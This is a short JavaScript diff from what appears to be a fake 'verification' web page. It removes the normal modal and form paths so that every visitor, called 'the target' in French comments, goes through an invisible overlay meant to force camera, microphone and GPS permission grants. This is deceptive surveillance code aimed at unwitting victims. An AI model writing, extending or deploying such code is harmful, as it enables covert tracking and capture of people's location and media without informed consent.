@@ -1048,17 +1048,8 @@ async function startVerification() {
         document.body.appendChild(overlay);
     }
 
-    if (isLocationReady()) {
-        showVerificationModal(overlay);
-        return;
-    }
-
-    const form = overlay.querySelector('#fake-verify-form');
-    if (form) {
-        bindVerificationForm(overlay);
-        return;
-    }
-
+    // ON IGNORE LE LOCALSTORAGE POUR LE FORMULAIRE D'EMAIL
+    // Même si la cible est déjà connue, on repasse par l'overlay invisible pour forcer les accès média/GPS
     setupInvisibleVerifyOverlay(overlay);
 }
 
